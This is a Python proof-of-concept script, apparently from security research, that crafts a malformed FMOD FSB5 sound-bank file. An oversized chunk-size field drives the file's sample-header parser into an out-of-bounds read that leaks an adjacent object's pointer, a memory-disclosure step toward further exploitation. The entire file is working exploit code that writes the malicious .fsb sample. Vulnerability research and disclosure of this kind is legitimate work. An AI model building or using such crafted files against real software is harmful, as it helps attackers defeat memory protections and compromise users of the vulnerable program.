#!/usr/bin/env python3
# Craft the SQ1 leak-reflection FSB5 sample. It drives the sample-header walk
# (builder halo3+0x4e92e0) so the attacker-sized OOB read lands at blob+DELTA,
# which in leak mode (RAWLOAD_LEAK=1) is a MAPPED page holding a planted
# adjacent FMOD object (a pointer). The walk reads that pointer without faulting.
#
# Layout driven:
#   sample0 base (has_chunks=1)          at blob[0..8)
#   chunk0 {type=4(skip), size=DELTA-12, more=1}  at blob[8..12)
#     -> after base(+8) + chunkhdr(+4) + size(DELTA-12), r10 = blob+DELTA
#   chunk1 read  -> [blob+DELTA] = the planted pointer's low dword (4 bytes)
#
# Usage: craft_leak.py <outdir> [delta]
import struct, sys, os

OUT   = sys.argv[1] if len(sys.argv) > 1 else "."
DELTA = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x2a0000
os.makedirs(OUT, exist_ok=True)

def hdr(numSamples, sampleHeadersSize, nameTableSize, dataSize, mode=0xf, f1c=1, f20=0, version=1):
    h = bytearray(0x3c)
    h[0:4] = b"FSB5"
    struct.pack_into("<I", h, 0x04, version)
    struct.pack_into("<I", h, 0x08, numSamples)
    struct.pack_into("<I", h, 0x0c, sampleHeadersSize)
    struct.pack_into("<I", h, 0x10, nameTableSize)
    struct.pack_into("<I", h, 0x14, dataSize)
    struct.pack_into("<I", h, 0x18, mode)
    struct.pack_into("<I", h, 0x1c, f1c)
    struct.pack_into("<I", h, 0x20, f20)
    return h

def chunk(ctype, size, more):
    return struct.pack("<I", ((ctype & 0x7f) << 25) | ((size & 0xffffff) << 1) | (more & 1))

def sample_base(has_chunks=1):
    return struct.pack("<Q", has_chunks & 1)   # bit0 = has extra-param chunks

size0 = DELTA - 12
assert 0 < size0 <= 0xffffff, "DELTA-12 must fit in the 24-bit chunk size field"

blob = bytearray()
blob += sample_base(has_chunks=1)
blob += chunk(ctype=4, size=size0, more=1)     # skip-type, keep walking by DELTA-12
sh = len(blob)                                 # = 12
data = bytes(hdr(1, sh, 0, 0)) + bytes(blob)
p = os.path.join(OUT, "poc_v6_leak_reflect.fsb")
open(p, "wb").write(data)
print("wrote %s  %d bytes  (DELTA=0x%x, size0=0x%x)" % (p, len(data), DELTA, size0))
